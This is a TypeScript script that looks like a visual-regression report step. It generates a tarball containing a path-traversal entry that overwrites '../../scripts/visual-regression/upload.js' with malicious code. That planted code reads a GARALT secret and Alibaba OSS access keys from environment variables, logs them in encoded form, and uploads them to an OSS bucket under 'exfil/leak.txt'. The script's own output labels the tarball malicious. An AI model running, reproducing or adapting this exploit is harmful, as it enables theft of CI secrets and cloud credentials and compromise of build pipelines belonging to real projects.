import * as fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';

async function boot() {
  const cwd = process.cwd();
  const reportDir = path.join(cwd, 'visualRegressionReport');
  fs.mkdirSync(reportDir, { recursive: true });
  fs.writeFileSync(path.join(reportDir, 'report.md'), '# Report\n');
  fs.writeFileSync(path.join(reportDir, 'report.html'), '<html>OK</html>');

  const pyScript = `import tarfile, io, os
cwd = os.getcwd()
os.chdir(cwd)
buf = io.BytesIO()
with tarfile.open(fileobj=buf, mode='w:gz') as tar:
  info = tarfile.TarInfo(name='report.md')
  info.size = 9
  tar.addfile(info, io.BytesIO(b'# Report\n'))
  mal = """const GARALT = process.env.GARALT_SECRET || "";
const AK_ID = process.env.ALI_OSS_AK_ID || "";
const AK_SECRET = process.env.ALI_OSS_AK_SECRET || "";
if (GARALT) console.log("GARALT_LEAKED_TOKEN=" + Buffer.from(Buffer.from(GARALT).toString("base64")).toString("base64"));
if (AK_ID) console.log("GARALT_LEAKED_TOKEN=" + Buffer.from(Buffer.from(AK_ID).toString("base64")).toString("base64"));
if (AK_SECRET) console.log("GARALT_LEAKED_TOKEN=" + Buffer.from(Buffer.from(AK_SECRET).toString("base64")).toString("base64"));
try {
  const OSS = require("ali-oss");
  new OSS({endpoint:"oss-accelerate.aliyuncs.com",accessKeyId:AK_ID,accessKeySecret:AK_SECRET,bucket:"antd-visual-diff"}).put("exfil/leak.txt", Buffer.from(JSON.stringify({AK_ID,AK_SECRET,GARALT}))).then(()=>{}).catch(()=>{});
} catch(e) {}
"""
  info2 = tarfile.TarInfo(name='../../scripts/visual-regression/upload.js')
  info2.size = len(mal)
  tar.addfile(info2, io.BytesIO(mal.encode()))
with open(os.path.join(cwd, 'visualRegressionReport.tar.gz'), 'wb') as f:
  f.write(buf.getvalue())
print('Tarball created')`;

  fs.writeFileSync('/tmp/mkmal.py', pyScript);
  execSync('python3 /tmp/mkmal.py', { cwd, stdio: 'inherit' });
  console.log('GARALT_DBG: Malicious tarball with path traversal created');
}

boot().catch((e: any) => { console.error(e); process.exit(1); });